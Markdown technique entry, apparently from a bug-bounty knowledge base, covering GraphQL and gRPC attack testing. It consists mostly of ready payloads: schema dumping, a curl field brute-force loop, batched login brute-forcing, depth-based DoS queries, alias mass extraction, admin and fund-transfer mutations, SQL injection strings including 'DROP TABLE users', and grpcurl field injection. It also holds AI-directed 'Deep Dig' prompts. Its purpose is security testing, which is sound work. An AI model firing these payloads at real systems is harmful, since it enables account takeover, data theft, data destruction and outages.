---
id: "graphql-grpc"
title: "GraphQL & gRPC Hunting Masterclass (2026 Edition)"
type: "technique"
category: "api-security"
subcategory: "graphql"
tags: ["graphql", "grpc", "protobuf", "introspection", "batching", "alias-dos", "authorization", "deep-dig"]
platforms: ["linux", "macos", "windows"]
related: ["idor-bola", "rate-limiting-bypass", "business-logic-flaws"]
difficulty: "advanced"
updated: "2026-04-14"
---

# GraphQL & gRPC Hunting Masterclass (2026 Edition)

## Why These Matter
GraphQL powers 70%+ of modern SPAs; gRPC dominates microservices and mobile backends. Both expose massive attack surfaces that traditional scanners completely miss.

## GraphQL Discovery

### Finding GraphQL Endpoints
```
# Common endpoints:
/graphql
/api/graphql
/graphql/v1
/api/v1/graphql
/query
/gql
/graphiql        # Interactive IDE (may expose schema)
/playground      # GraphQL Playground
/altair          # Altair client
/explorer        # Apollo Explorer
/__graphql       # Hidden endpoint
/graphql/console

# Detection via error messages:
POST /graphql
Content-Type: application/json
{"query": "{__typename}"}

# Returns: {"data": {"__typename": "Query"}} → GraphQL confirmed
```

### Introspection Attack
```graphql
# Full schema dump:
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
          kind
          ofType { name kind }
        }
        args { name type { name kind } }
      }
    }
    queryType { name }
    mutationType { name }
    subscriptionType { name }
  }
}

# If introspection is disabled, try:
# 1. Different endpoint (/graphql/v1, /api/graphql)
# 2. GET request instead of POST
# 3. Add special headers (X-Apollo-Tracing: 1)
# 4. Use field suggestion (typo-based schema leak)

# Field suggestion exploit:
{
  users {
    usrname  # Typo → error may suggest "Did you mean 'username'?"
  }
}
# Enumerate all fields via deliberate typos
```

### Introspection Bypass (Clairvoyance)
```bash
# When introspection is disabled, use field brute-forcing:
# Clairvoyance tool:
python3 -m clairvoyance -u https://target.com/graphql -w wordlist.txt

# Manual: Use error message suggestions
# GraphQL engines often suggest valid field names on typos
# "Cannot query field 'xyz' on type 'User'. Did you mean 'name', 'email'?"

# Brute force queries with common field names:
for field in id name email password role admin token; do
  echo "Testing: $field"
  curl -s https://target.com/graphql \
    -H "Content-Type: application/json" \
    -d "{\"query\": \"{users{$field}}\"}" | grep -v "Cannot query"
done
```

## GraphQL Attack Techniques

### 1. Authorization Bypass
```graphql
# Test IDOR on queries:
query {
  user(id: "other_user_id") {
    email
    role
    apiKey
    password  # Some schemas expose this!
  }
}

# Test mutations without auth:
mutation {
  updateUser(id: "victim_id", role: "admin") {
    id
    role
  }
}

mutation {
  deleteUser(id: "victim_id") {
    success
  }
}

# Field-level authorization:
# Can a regular user query admin-only fields?
query {
  me {
    email          # User field (allowed)
    internalNotes  # Admin field (should be blocked)
    apiSecretKey   # System field (should be blocked)
  }
}

# Nested object authorization:
query {
  myOrganization {
    billingInfo { creditCard lastFour }  # Owner-only?
    members { password resetToken }       # Admin-only?
  }
}
```

### 2. Batching Attacks (Rate Limit Bypass)
```graphql
# Send multiple queries in one request:
[
  {"query": "mutation { login(email:\"admin@target.com\", password:\"pass1\") { token }}"},
  {"query": "mutation { login(email:\"admin@target.com\", password:\"pass2\") { token }}"},
  {"query": "mutation { login(email:\"admin@target.com\", password:\"pass3\") { token }}"}
]

# Rate limiter sees 1 HTTP request
# Server executes 100+ login attempts

# Or use aliases in a single query:
query {
  a1: login(email:"admin@target.com", password:"pass1") { token }
  a2: login(email:"admin@target.com", password:"pass2") { token }
  a3: login(email:"admin@target.com", password:"pass3") { token }
  # ... up to thousands of aliases
}
```

### 3. Query Depth / Complexity Attack (DoS)
```graphql
# Nested relationships cause exponential database queries:
query {
  users {
    friends {
      friends {
        friends {
          friends {
            friends {
              name
              email
            }
          }
        }
      }
    }
  }
}

# Each level multiplies the number of DB queries
# 5 levels deep with 100 users per level = 100^5 = 10 billion queries

# Circular reference abuse:
query {
  user(id: "1") {
    posts {
      author {
        posts {
          author {
            posts { title }  # Infinite loop if not depth-limited
          }
        }
      }
    }
  }
}
```

### 4. Alias-Based Data Exfiltration
```graphql
# Use aliases to extract many records in one query:
query {
  u1: user(id: "1") { email name role }
  u2: user(id: "2") { email name role }
  u3: user(id: "3") { email name role }
  # ... enumerate all user IDs
  u1000: user(id: "1000") { email name role }
}

# Single request, 1000 user records extracted
# Bypasses per-request rate limits and pagination controls
```

### 5. Mutation Abuse
```graphql
# Find mutations that shouldn't be user-accessible:
mutation {
  # Admin operations:
  createUser(email:"attacker@evil.com", role:"admin") { id token }
  setConfig(key:"debug_mode", value:"true") { success }
  resetDatabase(confirm:true) { success }
  
  # Dangerous data operations:
  exportAllUsers { csv_url }
  sendBulkEmail(to:"all_users", body:"phishing") { sent_count }
  
  # Financial:
  creditAccount(userId:"my_id", amount:99999) { balance }
  transferFunds(from:"company", to:"my_id", amount:10000) { success }
}
```

### 6. Subscription Hijacking
```graphql
# GraphQL subscriptions use WebSockets
# Test if you can subscribe to other users' events:

subscription {
  userNotifications(userId: "victim_id") {
    message
    type
    data
  }
}

subscription {
  orderUpdates(orderId: "victim_order_id") {
    status
    trackingNumber
    shippingAddress
  }
}

# Also test: Can you subscribe without authentication?
# WebSocket auth is often weaker than HTTP auth
```

### 7. SQL Injection via GraphQL
```graphql
# GraphQL arguments flow to backend queries
# Test for injection in filter/search parameters:

query {
  users(filter: "admin' OR 1=1--") {
    id email role
  }
}

query {
  search(query: "test\"; DROP TABLE users;--") {
    results { id }
  }
}

query {
  products(orderBy: "price ASC; SELECT * FROM users--") {
    name price
  }
}
```

### 8. File Upload via GraphQL
```graphql
# GraphQL multipart upload specification:
# https://github.com/jaydenseric/graphql-multipart-request-spec

# Test for unrestricted file upload:
mutation($file: Upload!) {
  uploadAvatar(file: $file) {
    url
  }
}

# Upload .php, .jsp, .aspx files
# Check if uploaded to web-accessible directory
# Test for path traversal in filename
```

## gRPC Attack Surface

### Discovery
```bash
# gRPC server reflection (like GraphQL introspection):
grpcurl -plaintext target.com:50051 list
grpcurl -plaintext target.com:50051 describe

# Common gRPC ports: 50051, 443 (with TLS), 8443

# Check for reflection:
grpcurl -plaintext target.com:50051 grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo

# If no reflection, look for .proto files:
# In mobile apps (APK/IPA), JavaScript bundles, GitHub repos
```

### gRPC Attacks
```bash
# Call methods with manipulated parameters:
grpcurl -plaintext -d '{"user_id": "victim_id"}' \
  target.com:50051 user.UserService/GetProfile

# Field injection (add unexpected protobuf fields):
# Protobuf silently ignores unknown fields
# Add admin fields, role fields, internal flags
grpcurl -plaintext -d '{"user_id": "1", "role": "admin", "is_internal": true}' \
  target.com:50051 user.UserService/UpdateUser

# Large message DoS:
# Send protobuf with very large repeated fields
# or deeply nested messages to exhaust server memory

# Type confusion:
# Send wrong type for a field (string instead of int)
# Some implementations crash or leak info
```

## Deep Dig Prompts
```
Given this GraphQL schema [paste introspection or describe]:
1. List all queries/mutations and check which require auth
2. Test IDOR on every query that takes an ID parameter
3. Check field-level authorization on sensitive fields
4. Test batching to bypass rate limits on login/OTP
5. Craft depth attack to test for DoS protection
6. Use aliases to mass-extract data
7. Check if subscriptions expose other users' events
8. Test for SQL injection in filter/search/orderBy arguments
```

## Tools
- InQL (Burp extension for GraphQL)
- GraphQL Voyager (schema visualization)
- Clairvoyance (introspection bypass via brute force)
- Altair (GraphQL client)
- grpcurl (gRPC command-line client)
- grpcui (gRPC web UI)
- Burp gRPC extension
- graphql-cop (GraphQL security auditing)

## Key Signals
- `/graphql` endpoint responding to `{__typename}`
- `Content-Type: application/graphql`
- WebSocket connections for subscriptions
- gRPC-Web headers in responses
- `.proto` files in mobile app binaries
- Apollo, Hasura, Prisma in stack fingerprint
